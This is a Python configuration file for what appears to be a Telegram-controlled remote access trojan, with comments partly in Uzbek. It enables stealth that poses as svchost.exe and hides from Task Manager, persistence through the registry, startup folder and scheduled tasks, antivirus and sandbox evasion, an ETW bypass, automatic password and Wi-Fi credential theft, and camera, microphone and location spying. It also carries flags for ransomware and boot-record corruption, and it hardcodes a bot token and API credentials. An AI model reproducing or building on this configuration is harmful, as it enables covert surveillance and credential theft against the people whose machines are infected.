# config.py - v3.0.6 SECURE CONFIGURATION
"""
v3.0.6 - Yangi arxitektura:
  - Client BOT ga xabar yuboradi (ADMIN_ID ga emas)
  - Server Bot qurilmalarni boshqaradi
  - Admin Server Bot orqali boshqaradi
"""

import sys 
import os
from pathlib import Path

# .env fayldan o'qish uchun yordamchi funksiya
def _load_env():
    """Load .env file if exists"""
    env_file = Path(__file__).parent / ".env"
    if env_file.exists():
        try:
            with open(env_file, 'r', encoding='utf-8') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#') and '=' in line:
                        key, value = line.split('=', 1)
                        os.environ.setdefault(key.strip(), value.strip())
        except:
            pass

_load_env()

# ==================== TELEGRAM API ====================
# For frozen EXE: use hardcoded values
# For development: load from .env
import sys as _sys
if getattr(_sys, 'frozen', False):
    # EXE mode - hardcoded values
    API_ID = 21888757
    API_HASH = "5b839954e8ac566c8598ad56aaae9cc4"
    BOT_TOKEN = "7908116465:AAF8RbQBjKPr69lC10mX6RePEYWs-wRHWKs"
    ADMIN_ID = 6990611858
else:
    # Development mode - load from .env
    API_ID = int(os.environ.get('API_ID', '0'))
    API_HASH = os.environ.get('API_HASH', '<MUST_SET_IN_ENV>')
    BOT_TOKEN = os.environ.get('BOT_TOKEN', '<MUST_SET_IN_ENV>')
    ADMIN_ID = int(os.environ.get('ADMIN_ID', '0'))

# ==================== AI API (OpenRouter) ====================
USE_OPENROUTER = True  # True = OpenRouter, False = Google Gemini
OPENROUTER_API_KEY = os.environ.get('OPENROUTER_API_KEY', '')
OPENROUTER_MODEL = "google/gemini-2.0-flash-exp:free"
GEMINI_API_KEY = os.environ.get('GEMINI_API_KEY', '')

# ==================== GITHUB ====================
GITHUB_USERNAME = os.environ.get('GITHUB_USERNAME', '')
GITHUB_REPO = os.environ.get('GITHUB_REPO', '')
GITHUB_TOKEN = os.environ.get('GITHUB_TOKEN', '')

# ==================== VERSION ====================
CURRENT_VERSION = "3.0.6"

# ==================== SERVER BOT (v3.0.6) ====================
# Client bu BOT ga xabar yuboradi, ADMIN_ID ga emas
# BOT_ID = BOT ning o'zi (bot token dagi birinchi raqamlar)
if getattr(_sys, 'frozen', False):
    SERVER_BOT_ID = 7908116465  # Bot token: 7908116465:AAF8RbQ...
else:
    # Bot token dan olish: 7908116465:AAF8RbQ...
    _bot_token = os.environ.get('BOT_TOKEN', '')
    SERVER_BOT_ID = int(_bot_token.split(':')[0]) if ':' in _bot_token else 0

# ==================== SECURITY (v3.0.5) ====================
# HMAC secret for device authentication
HMAC_SECRET = os.environ.get('HMAC_SECRET', '')
if not HMAC_SECRET:
    import secrets
    HMAC_SECRET = secrets.token_hex(32)  # Auto-generate if not set

# ==================== BASIC SETTINGS ====================
DEBUG_MODE = False
MAX_FILE_SIZE = 50 * 1024 * 1024  # 50 MB
SCREENSHOT_QUALITY = 85
LIVE_STREAM_FPS = 2

# ==================== AUTO-UPDATE ====================
# ⚠️ v3.0.5: Default O'CHIRILGAN - xavfsizlik uchun
AUTO_UPDATE_ENABLED = os.environ.get('AUTO_UPDATE_ENABLED', 'false').lower() == 'true'
AUTO_UPDATE_INTERVAL = 6  # hours
AUTO_UPDATE_VERIFY_CHECKSUM = True  # v3.0.5: Checksum tekshirish majburiy

# ==================== MEDIA RECORDING ====================
SCREEN_RECORDING_FPS = 10
SCREEN_RECORDING_QUALITY = 'medium'
CAMERA_RECORDING_FPS = 20
CAMERA_RECORDING_DURATION_MAX = 300

# ==================== AUDIO ====================
AUDIO_SAMPLE_RATE = 44100
AUDIO_CHANNELS = 2
MIC_MONITOR_DURATION_MAX = 120
TTS_LANGUAGE = 'en-US'
TTS_RATE = 0
TTS_VOLUME = 100

# ==================== MONITORING ====================
NETWORK_MONITOR_INTERVAL = 1
APP_TRACKING_ENABLED = True
APP_TRACKING_INTERVAL = 60
PROCESS_MONITOR_TOP = 10

# ==================== LOCATION ====================
LOCATION_ENABLED = True
GPS_ENABLED = True
WIFI_LOCATION_ENABLED = True
IP_LOCATION_ENABLED = True
LOCATION_UPDATE_INTERVAL = 60
GEOFENCING_ENABLED = False
GEOFENCE_RADIUS = 100
GOOGLE_GEOLOCATION_API_KEY = ""  # Free: 100 req/day

# ==================== STEALTH MODE ====================
STEALTH_ENABLED = True
HIDE_CONSOLE = True
HIDE_FROM_TASK_MANAGER = True
RANDOM_PROCESS_NAME = True
PROCESS_NAMES = ['svchost.exe', 'explorer.exe', 'dwm.exe', 'system']
ANTI_FORENSICS = True
CLEAR_LOGS_ON_START = False

# ==================== PERSISTENCE ====================
PERSISTENCE_ENABLED = True
REGISTRY_PERSISTENCE = True
STARTUP_FOLDER_PERSISTENCE = True
TASK_SCHEDULER_PERSISTENCE = True
WMI_PERSISTENCE = False
COM_HIJACKING = False

# ==================== ANTIVIRUS EVASION ====================
ANTIVIRUS_EVASION = True
SANDBOX_DETECTION = True
VM_DETECTION = True
ANTI_DEBUG = True
AMSI_BYPASS = False
ETW_BYPASS = True
DEFENDER_DISABLE_ON_START = False

# ==================== DATA EXFILTRATION ====================
AUTO_COLLECT_PASSWORDS = True
AUTO_COLLECT_COOKIES = False
AUTO_COLLECT_HISTORY = False
AUTO_COLLECT_WIFI = True
COLLECT_CRYPTO_WALLETS = False
COLLECT_FTP_CREDENTIALS = False
COLLECT_EMAIL_CREDENTIALS = False

# ==================== SMART FEATURES ====================
AUTO_SCREENSHOT_ON_ACTIVITY = False
AUTO_SCREENSHOT_INTERVAL = 0
AUTO_RECORD_ON_MIC = False
KEYWORD_MONITORING = False
KEYWORDS = ['password', 'credit card', 'bank']
USB_MONITORING = False

# ==================== REMOTE DESKTOP ====================
REMOTE_DESKTOP_ENABLED = False
VNC_PORT = 5900
MOUSE_CONTROL_ENABLED = False
KEYBOARD_CONTROL_ENABLED = False

# ==================== REPORTING ====================
DAILY_REPORTS = False
REPORT_TIME = "23:59"
REPORT_FORMAT = "markdown"
ACTIVITY_SUMMARY = True

# ==================== NOTIFICATIONS ====================
NOTIFY_ON_DEVICE_ONLINE = True
NOTIFY_ON_DEVICE_OFFLINE = True
NOTIFY_ON_ERROR = False
NOTIFY_ON_COMMAND_EXECUTED = False
NOTIFY_ON_NEW_WIFI = True
NOTIFY_ON_LOCATION_CHANGE = False

# ==================== SECURITY ====================
ENCRYPTION_ENABLED = False
PASSWORD_PROTECTION = False
ADMIN_PASSWORD = ""
TWO_FACTOR_AUTH = False
IP_WHITELIST = []
SELF_DESTRUCT_ON_DETECT = False

# ==================== NETWORK ATTACKS ====================
PORT_SCANNING = False
NETWORK_MAPPING = False
ARP_SPOOFING = False
DNS_HIJACKING = False
MITM_ATTACK = False
PACKET_SNIFFING = False

# ==================== FUN FEATURES ====================
PRANKS_ENABLED = False
ALLOW_SCREEN_FLIP = False
ALLOW_FAKE_BSOD = False
ALLOW_MOUSE_CHAOS = False
ALLOW_POPUP_SPAM = False

# ==================== AI ASSISTANT ====================
AI_ENABLED = True
AI_CHAT_MODE = True
AI_ERROR_EXPLANATION = True
AI_SMART_SUGGESTIONS = True
AI_CONTEXT_AWARE = True
AI_CONVERSATION_HISTORY_LIMIT = 100

# ==================== DATABASE ====================
DATABASE_ENABLED = True
DATABASE_FILE = "bot_data.db"
DATABASE_BACKUP_ENABLED = True
DATABASE_BACKUP_INTERVAL = 86400

# ==================== DEVICE MANAGER ====================
DEVICE_REGISTRY_FILE = "devices.json"
HEARTBEAT_INTERVAL = 60
HEARTBEAT_TIMEOUT = 120
DEVICE_ID_FORMAT = "DEV-{hostname}-{mac}-{random}"

# ==================== SERVER BOT ====================
SERVER_BOT_ENABLED = True
SERVER_BOT_PORT = 8080

# ==================== LOGGING ====================
LOG_LEVEL = "INFO"
LOG_FILE = "bot.log"
LOG_MAX_SIZE = 10 * 1024 * 1024
LOG_BACKUP_COUNT = 5

# ==================== PATHS ====================
if getattr(sys, 'frozen', False):
    BASE_DIR = Path(os.path.dirname(sys.executable))
else:
    BASE_DIR = Path(__file__).parent

DATA_DIR = Path(os.environ.get("APPDATA", "")) / "Microsoft" / "Crypto" / "system"
DATA_DIR.mkdir(parents=True, exist_ok=True)

SESSION_NAME = str(DATA_DIR / "session")
DEVICES_FILE = DATA_DIR / "net.dat"
DATABASE_PATH = DATA_DIR / DATABASE_FILE
LOG_PATH = DATA_DIR / LOG_FILE

# ==================== VALIDATION (v3.0.5 STRICT) ====================
_missing = []
if API_ID == 0:
    _missing.append('API_ID')
if API_HASH == '<MUST_SET_IN_ENV>' or not API_HASH:
    _missing.append('API_HASH')
if BOT_TOKEN == '<MUST_SET_IN_ENV>' or not BOT_TOKEN:
    _missing.append('BOT_TOKEN')
if ADMIN_ID == 0:
    _missing.append('ADMIN_ID')

if _missing:
    import sys
    if getattr(sys, 'frozen', False):
        # EXE rejimida faqat warning
        pass
    else:
        raise ValueError(f"[WARNING] .env faylda quyidagi o'zgaruvchilar yo'q: {', '.join(_missing)}")

if AI_ENABLED:
    if USE_OPENROUTER:
        if not OPENROUTER_API_KEY or OPENROUTER_API_KEY == "YOUR_KEY":
            pass  # OpenRouter API key not configured - silent in EXE mode
            AI_ENABLED = False
    else:
        if not GEMINI_API_KEY or GEMINI_API_KEY == "YOUR_API_KEY":
            pass  # Gemini API key not configured - silent in EXE mode
            AI_ENABLED = False

if AUTO_UPDATE_ENABLED and (GITHUB_USERNAME == "YOUR_USERNAME"):
    pass  # GitHub not configured - silent in EXE mode
    AUTO_UPDATE_ENABLED = False

# ==================== FEATURE FLAGS ====================
FEATURES = {
    'media_recording': True,
    'audio_control': True,
    'monitoring': True,
    'system_control': True,
    'stealth': STEALTH_ENABLED,
    'ai': AI_ENABLED,
    'location': LOCATION_ENABLED,
    'remote_desktop': REMOTE_DESKTOP_ENABLED,
    'data_exfiltration': True,
    'smart_features': True,
    'reporting': DAILY_REPORTS,
    'network_attacks': False,
    'fun_features': PRANKS_ENABLED
}

# ==================== DANGER ZONE ====================
DANGER_FEATURES = {
    'system32_delete': False,
    'boot_record_corruption': False,
    'ransomware_mode': False,
    'ddos_attack': False,
    'credential_theft': False,
}

if any(DANGER_FEATURES.values()):
    pass  # Danger features warning - silent in EXE mode

# ==================== EXPORT ====================
__all__ = [
    'API_ID', 'API_HASH', 'BOT_TOKEN', 'ADMIN_ID',
    'USE_OPENROUTER', 'OPENROUTER_API_KEY', 'OPENROUTER_MODEL',
    'GEMINI_API_KEY', 'GITHUB_USERNAME', 'GITHUB_REPO',
    'GOOGLE_GEOLOCATION_API_KEY',
    'CURRENT_VERSION', 'DEBUG_MODE', 'FEATURES',
    'SESSION_NAME', 'DEVICES_FILE', 'DATABASE_PATH'
]